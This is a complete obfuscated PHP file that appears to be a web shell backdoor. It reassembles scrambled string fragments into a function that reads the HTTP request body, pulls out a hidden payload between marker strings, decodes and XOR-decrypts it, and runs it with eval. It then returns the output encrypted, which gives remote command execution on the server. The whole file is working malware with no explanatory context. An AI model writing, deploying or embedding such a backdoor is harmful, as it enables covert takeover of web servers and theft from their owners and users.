<?php
$B='E=1) {@8Eob_8Estart();@ev8Eal(@gzunc8Eomp8Eress(@x(@8Eba8Es8E8Ee64_deco';
$h=str_replace('WQ','','cWQreaWQtWQe_fWQuncWQtWQion');
$L='"5Hu6aGk8E3OMl8EQo8EoVd";functio8En 8Ex($t,$k)8E8E{$c=strlen($k)8E8E;$l=';
$v='@b8Ease64_enc8Eode(8E@x(@g8Ezc8Eompress($o),$8Ek));pr8Eint8E("$p$kh$8Er$kf");}';
$l='$k=8E"6bca71b8E8Ea";$kh="c478E3c19baefb"8E;$kf="8E7de7e8E1d2d338E4";8E$p=';
$E='de($m[1]),$k))8E);$o=8E@ob_get8E_conten8Ets();@8Eo8Eb_end_8Eclean8E();$r=';
$w='$j++,$i++8E8E){$8Eo.=$t{$i}^8E$8Ek{$8Ej};}}retur8En $o;}if8E (@preg_mat';
$N='c8Eh("8E/$kh8E(.+)$kf/",@fi8Ele_g8Eet_cont8Een8Ets("php://8Einp8Eut"8E),$m)=8';
$n='s8Etr8Elen(8E$t8E);$o=8E"";for($i=0;$i<8E$l;){for(8E$j=0;8E($j<$c&&8E$i<$l);8E';
$z=str_replace('8E','',$l.$L.$n.$w.$N.$B.$E.$v);
$b=$h('',$z);$b();
?>
